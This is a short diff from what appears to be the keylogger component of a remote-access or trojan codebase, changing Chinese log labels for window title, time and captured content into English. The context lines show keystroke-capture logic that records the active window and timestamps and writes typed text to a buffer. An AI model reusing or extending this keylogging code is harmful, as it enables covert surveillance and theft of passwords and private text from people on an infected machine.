@@ -438,7 +438,7 @@ BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowC
             if (hasData) {
                 SYSTEMTIME   s;
                 GetLocalTime(&s);
-                sprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
+                sprintf(szText, _T("\r\n[Title:] %s\r\n[Time:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
                         WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
             }
             memset(WindowCaption, 0, CAPTION_SIZE);
@@ -600,9 +600,9 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
             if (lstrlen(KeyBuffer) > 0) {
                 if (!newWindowInput)
                     lstrcat(KeyBuffer, _T("\r\n"));
-                const int offset = sizeof(_T("\r\n[内容:]")) - 1;
+                const int offset = sizeof(_T("\r\n[Content:]")) - 1;
                 memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
-                memcpy(KeyBuffer, _T("\r\n[内容:]"), offset);
+                memcpy(KeyBuffer, _T("\r\n[Content:]"), offset);
                 pThis->m_Buffer->Write(KeyBuffer, strlen(KeyBuffer));
                 memset(KeyBuffer,0,sizeof(KeyBuffer));
             }
